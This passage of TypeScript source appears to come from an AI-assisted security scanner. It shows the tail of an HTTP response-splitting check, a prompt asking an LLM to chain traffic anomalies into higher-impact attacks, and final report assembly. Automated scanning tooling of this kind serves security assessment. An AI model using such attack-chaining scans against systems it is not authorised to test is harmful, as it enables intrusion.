                  type: 'Traffic Anomaly', subtype: 'Response splitting',
                  endpoint: asset, gap: 'HTTP response splitting via header injection — CRLF in redirect parameter creates injected headers',
                  chain_potential: 'Cache poisoning, XSS via injected headers, session fixation', severity: 'CRITICAL',
                });
                trafficCount++;
              }
            } catch {}
          } catch {}
        }

        // 4f-3: AI-driven traffic pattern synthesis
        if (ai && trafficCount > 0) {
          this.log(jobId, 'info', 'Phase 4f-3: AI traffic pattern analysis');
          const trafficMemory = MemoryManager.getMemory(jobId, hostname);
          const trafficFindings = trafficMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Traffic Anomaly');
          const recentTraffic = trafficFindings.slice(-10);

          if (recentTraffic.length >= 2) {
            const trafficPrompt = `Analyze the following network and host traffic anomalies discovered during the security assessment of ${targetUrl}.

Anomalies Found:
${JSON.stringify(recentTraffic, null, 2)}

Infrastructure Context:
- Server: ${behaviorBaselines.values().next().value?.serverHeader || 'unknown'}
- Assets scanned: ${discoveredAssets.length}
- Endpoints analyzed: ${endpoints.length}

Your task:
1. Identify patterns that suggest systemic infrastructure weaknesses
2. Determine if any traffic anomalies can be combined for higher-impact attacks
3. Assess whether the infrastructure is vulnerable to advanced persistent threat (APT) techniques
4. Rate the overall network security posture

Return JSON: {
  "infrastructure_risk": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
  "systemic_issues": string[],
  "attack_surfaces": [{ "name": string, "findings_used": string[], "impact": string, "feasibility": number }],
  "apt_indicators": string[]
}`;

            const trafficAnalysis = safeJsonParse<{
              infrastructure_risk: string; systemic_issues: string[];
              attack_surfaces: { name: string; findings_used: string[]; impact: string; feasibility: number }[];
              apt_indicators: string[];
            }>(await ai.generate(trafficPrompt, true), {
              infrastructure_risk: 'UNKNOWN', systemic_issues: [], attack_surfaces: [], apt_indicators: []
            });

            for (const surface of trafficAnalysis.attack_surfaces.filter(s => s.feasibility > 0.6)) {
              MemoryManager.addFinding(jobId, hostname, {
                type: 'Traffic Anomaly', subtype: 'Infrastructure attack surface',
                gap: surface.impact, chain_potential: surface.name,
                findings_used: surface.findings_used, severity: trafficAnalysis.infrastructure_risk,
              });
            }

            if (trafficAnalysis.apt_indicators.length > 0) {
              this.log(jobId, 'info', `APT indicators identified: ${trafficAnalysis.apt_indicators.join(', ')}`);
            }

            this.log(jobId, 'info', `Infrastructure risk assessment: ${trafficAnalysis.infrastructure_risk}`);
          }
        }

        // Collect Phase 4f findings
        const phase4fMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4fFindings = phase4fMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Traffic Anomaly');
        const newPhase4fFindings = phase4fFindings.slice(phase4fFindings.length > trafficCount ? phase4fFindings.length - trafficCount : 0);
        if (newPhase4fFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4f', type: 'Traffic Anomaly Detection Results', data: newPhase4fFindings });
          vulnerabilities.push(...newPhase4fFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap,
            severity: f.severity || 'MEDIUM', phase: 'Phase 4f'
          })));
        }
        this.log(jobId, 'info', `Phase 4f complete: ${trafficCount} traffic anomaly(ies) added to report`);

        // --- PHASE 5: REPORTING (FINAL SYNTHESIS) ---
        this.updateJob(jobId, 'running', 'Phase 5: Reporting');
        this.log(jobId, 'info', 'Starting Phase 5: Final Report Synthesis');

        const finalReport = {
          target: targetUrl,
          timestamp: new Date().toISOString(),
          summary: {
            assets: discoveredAssets.length,
            endpoints: endpoints.length,
            vulnerabilities: vulnerabilities.length
          },
          detailed_findings: allFindings
        };

        this.log(jobId, 'info', 'Hunt completed.', { summary: finalReport.summary });
        this.updateJob(jobId, 'completed', 'completed', allFindings);

      } catch (err: any) {
        this.log(jobId, 'error', `Hunt failed at ${err.message}`);
        this.updateJob(jobId, 'failed');
      } finally {
        this.activeJobs--;
      }
    }, 0);

    return jobId;
  }
}
